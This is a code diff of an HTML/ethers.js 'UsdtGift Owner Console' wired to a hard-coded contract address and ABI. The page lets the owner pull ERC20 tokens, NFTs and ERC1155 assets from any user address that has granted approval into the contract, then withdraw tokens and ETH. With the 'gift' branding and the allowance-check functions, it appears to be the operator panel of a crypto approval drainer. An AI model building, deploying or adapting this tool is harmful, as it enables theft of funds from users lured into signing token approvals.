@@ -1,167 +1,107 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>UsdtGift Owner Console</title>
-    <style>
-        body {
-            background-color: #1a1a1a;
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
-            padding: 20px;
-        }
-
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-        }
-
-        .section {
-            background-color: #2a2a2a;
-            padding: 15px;
-            margin-bottom: 20px;
-            border-radius: 5px;
-        }
-
-        input, button {
-            background-color: #333;
-            color: #00ff00;
-            border: 1px solid #00ff00;
-            padding: 5px;
-            margin: 5px;
-        }
-
-        button {
-            cursor: pointer;
-        }
-
-        button:hover {
-            background-color: #444;
-        }
-
-        .log {
-            background-color: #000;
-            padding: 10px;
-            height: 200px;
-            overflow-y: auto;
-            white-space: pre-wrap;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>UsdtGift Owner Console</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <script src="https://cdn.ethers.io/lib/ethers-5.6.umd.min.js"></script>
+  <style>
+    body { padding: 2rem; background: #f8f9fa; }
+    .section { margin-bottom: 2rem; }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1>UsdtGift Owner Console</h1>
-        <button id="connectButton">Conectar Wallet</button>
-        
-        <div class="section">
-            <h3>Transferir al Contrato</h3>
-            <select id="assetType">
-                <option value="ERC20">ERC20</option>
-                <option value="ERC721">ERC721</option>
-                <option value="ERC1155">ERC1155</option>
-            </select>
-            
-            <div id="erc20Form">
-                <input type="text" id="userAddress" placeholder="User Address">
-                <input type="text" id="tokenAddress" placeholder="Token Address">
-                <input type="number" id="amount" placeholder="Amount">
-                <button onclick="transferToContract()">Transferir</button>
-            </div>
-        </div>
+  <h1 class="mb-4">UsdtGift Owner Console</h1>
 
-        <div class="section">
-            <h3>Retirar del Contrato</h3>
-            <select id="withdrawType">
-                <option value="ERC20">ERC20</option>
-                <option value="ERC721">ERC721</option>
-                <option value="ERC1155">ERC1155</option>
-                <option value="ETH">ETH</option>
-            </select>
-            
-            <div id="withdrawForm">
-                <input type="text" id="withdrawToken" placeholder="Token Address">
-                <input type="number" id="withdrawId" placeholder="Token ID">
-                <input type="number" id="withdrawAmount" placeholder="Amount">
-                <button onclick="withdrawAsset()">Retirar</button>
-            </div>
-        </div>
+  <button id="connectWallet" class="btn btn-primary mb-4">Conectar Wallet</button>
+  <p id="walletAddress"></p>
 
-        <div class="section">
-            <h3>Registro de Eventos</h3>
-            <div class="log" id="log"></div>
-        </div>
-    </div>
+  <div class="section">
+    <h3>transferERC20ToContract</h3>
+    <input id="erc20User" class="form-control mb-2" placeholder="User address">
+    <input id="erc20Token" class="form-control mb-2" placeholder="Token address">
+    <input id="erc20Amount" class="form-control mb-2" placeholder="Amount">
+    <button class="btn btn-success" onclick="transferERC20()">Ejecutar</button>
+  </div>
 
-    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
-    <script>
-        let contract;
-        let provider;
-        let signer;
-        
-        const contractABI = [ /* ABI del contrato aquí */ ];
+  <div class="section">
+    <h3>transferERC721ToContract</h3>
+    <input id="erc721User" class="form-control mb-2" placeholder="User address">
+    <input id="erc721Contract" class="form-control mb-2" placeholder="NFT contract">
+    <input id="erc721TokenId" class="form-control mb-2" placeholder="Token ID">
+    <button class="btn btn-success" onclick="transferERC721()">Ejecutar</button>
+  </div>
 
-        async function connectWallet() {
-            provider = new ethers.providers.Web3Provider(window.ethereum);
-            await provider.send("eth_requestAccounts", []);
-            signer = provider.getSigner();
-            contract = new ethers.Contract(contractAddress, contractABI, signer);
-            log('Wallet conectada: ' + await signer.getAddress());
-        }
+  <div class="section">
+    <h3>transferERC1155ToContract</h3>
+    <input id="erc1155User" class="form-control mb-2" placeholder="User address">
+    <input id="erc1155Contract" class="form-control mb-2" placeholder="NFT contract">
+    <input id="erc1155TokenId" class="form-control mb-2" placeholder="Token ID">
+    <input id="erc1155Amount" class="form-control mb-2" placeholder="Amount">
+    <button class="btn btn-success" onclick="transferERC1155()">Ejecutar</button>
+  </div>
 
-        async function transferToContract() {
-            const assetType = document.getElementById('assetType').value;
-            const userAddress = document.getElementById('userAddress').value;
-            const tokenAddress = document.getElementById('tokenAddress').value;
-            const amount = document.getElementById('amount').value;
+  <div class="section">
+    <h3>withdrawERC20</h3>
+    <input id="withdrawToken" class="form-control mb-2" placeholder="Token address">
+    <input id="withdrawAmount" class="form-control mb-2" placeholder="Amount">
+    <button class="btn btn-warning" onclick="withdrawERC20()">Ejecutar</button>
+  </div>
 
-            try {
-                if(assetType === 'ERC20') {
-                    await contract.transferERC20ToContract(userAddress, tokenAddress, amount);
-                }
-                else if(assetType === 'ERC721') {
-                    const tokenId = amount;
-                    await contract.transferERC721ToContract(userAddress, tokenAddress, tokenId);
-                }
-                else if(assetType === 'ERC1155') {
-                    await contract.transferERC1155ToContract(userAddress, tokenAddress, tokenId, amount);
-                }
-                log('Transacción enviada: ' + assetType);
-            } catch (error) {
-                log('Error: ' + error.message);
-            }
-        }
+  <div class="section">
+    <h3>withdrawETH</h3>
+    <input id="withdrawEthAmount" class="form-control mb-2" placeholder="Amount in ETH">
+    <button class="btn btn-warning" onclick="withdrawETH()">Ejecutar</button>
+  </div>
 
-        async function withdrawAsset() {
-            const withdrawType = document.getElementById('withdrawType').value;
-            const tokenAddress = document.getElementById('withdrawToken').value;
-            const tokenId = document.getElementById('withdrawId').value;
-            const amount = document.getElementById('withdrawAmount').value;
+  <script>
+    const CONTRACT_ADDRESS = "0x579d705fE8bA250eDA39aa51E6443AD971112686";
+    const ABI = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":true,"internalType":"address","name":"asset","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"ApprovalUpdated","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"asset","type":"address"},{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"AssetTransferred","type":"event"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"nftContract","type":"address"}],"name":"checkERC1155Approval","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"token","type":"address"}],"name":"checkERC20Allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"nftContract","type":"address"}],"name":"checkERC721Approval","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address[]","name":"tokensERC20","type":"address[]"},{"internalType":"uint256[]","name":"amounts","type":"uint256[]"},{"internalType":"address[]","name":"contractsERC721","type":"address[]"},{"internalType":"address[]","name":"contractsERC1155","type":"address[]"}],"name":"claimAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"bytes","name":"","type":"bytes"}],"name":"onERC1155Received","outputs":[{"internalType":"bytes4","name":"","type":"bytes4"}],"stateMutability":"pure","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"bytes","name":"","type":"bytes"}],"name":"onERC721Received","outputs":[{"internalType":"bytes4","name":"","type":"bytes4"}],"stateMutability":"pure","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferERC1155ToContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferERC20ToContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferERC721ToContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"transferETHToContract","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawERC1155","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawERC20","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"withdrawERC721","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawETH","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}];
 
-            try {
-                if(withdrawType === 'ERC20') {
-                    await contract.withdrawERC20(tokenAddress, amount);
-                }
-                else if(withdrawType === 'ERC721') {
-                    await contract.withdrawERC721(tokenAddress, tokenId);
-                }
-                else if(withdrawType === 'ERC1155') {
-                    await contract.withdrawERC1155(tokenAddress, tokenId, amount);
-                }
-                else if(withdrawType === 'ETH') {
-                    await contract.withdrawETH(amount);
-                }
-                log('Retiro exitoso: ' + withdrawType);
-            } catch (error) {
-                log('Error: ' + error.message);
-            }
-        }
+    let signer, contract;
 
-        function log(message) {
-            const logElement = document.getElementById('log');
-            logElement.innerHTML += new Date().toLocaleTimeString() + ' - ' + message + '\n';
-            logElement.scrollTop = logElement.scrollHeight;
-        }
+    document.getElementById("connectWallet").onclick = async () => {
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      signer = provider.getSigner();
+      contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
+      const address = await signer.getAddress();
+      document.getElementById("walletAddress").innerText = `Wallet conectada: ${address}`;
+    };
 
-        document.getElementById('connectButton').onclick = connectWallet;
-    </script>
+    async function transferERC20() {
+      const user = document.getElementById("erc20User").value;
+      const token = document.getElementById("erc20Token").value;
+      const amount = ethers.utils.parseUnits(document.getElementById("erc20Amount").value, 6);
+      await contract.transferERC20ToContract(user, token, amount);
+    }
+
+    async function transferERC721() {
+      const user = document.getElementById("erc721User").value;
+      const nft = document.getElementById("erc721Contract").value;
+      const tokenId = document.getElementById("erc721TokenId").value;
+      await contract.transferERC721ToContract(user, nft, tokenId);
+    }
+
+    async function transferERC1155() {
+      const user = document.getElementById("erc1155User").value;
+      const nft = document.getElementById("erc1155Contract").value;
+      const tokenId = document.getElementById("erc1155TokenId").value;
+      const amount = document.getElementById("erc1155Amount").value;
+      await contract.transferERC1155ToContract(user, nft, tokenId, amount);
+    }
+
+    async function withdrawERC20() {
+      const token = document.getElementById("withdrawToken").value;
+      const amount = ethers.utils.parseUnits(document.getElementById("withdrawAmount").value, 6);
+      await contract.withdrawERC20(token, amount);
+    }
+
+    async function withdrawETH() {
+      const amount = ethers.utils.parseEther(document.getElementById("withdrawEthAmount").value);
+      await contract.withdrawETH(amount);
+    }
+  </script>
 </body>
 </html>
